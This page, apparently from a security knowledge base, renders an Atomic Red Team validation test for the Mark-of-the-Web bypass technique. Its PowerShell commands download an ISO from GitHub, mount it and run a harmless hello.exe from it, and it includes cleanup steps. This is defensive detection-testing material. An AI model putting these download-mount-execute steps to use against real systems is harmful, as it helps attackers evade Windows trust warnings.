---
atomic_guid: "42f22b00-0242-4afc-a61b-0da05041f9cc"
title: "Mount an ISO image and run executable from the ISO"
framework: "atomic"
generated: "true"
attack_technique_id: "T1553.005"
attack_technique_name: "Subvert Trust Controls: Mark-of-the-Web Bypass"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "42f22b00-0242-4afc-a61b-0da05041f9cc"
  - "Mount an ISO image and run executable from the ISO"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Mount an ISO image and run executable from the ISO

Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. 
Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing "Hello, World!". 
ISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,

## Metadata

- Atomic GUID: 42f22b00-0242-4afc-a61b-0da05041f9cc
- Technique: T1553.005: Subvert Trust Controls: Mark-of-the-Web Bypass
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1553.005/T1553.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1553-subvert_trust_controls|T1553.005]]

## Input Arguments

### path_of_iso

- description: Path to ISO file
- type: path
- default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso

## Dependencies

FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})

### Prerequisite Check

```text
if (Test-Path "#{path_of_iso}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{path_of_iso}") -ErrorAction ignore | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile "#{path_of_iso}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
$keep = Get-Volume -FileSystemLabel "TestIso"
$driveLetter = ($keep | Get-Volume).DriveLetter
invoke-item "$($driveLetter):\hello.exe"
```

### Cleanup

```powershell
Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
Stop-process -name "hello" -Force -ErrorAction ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.yaml)
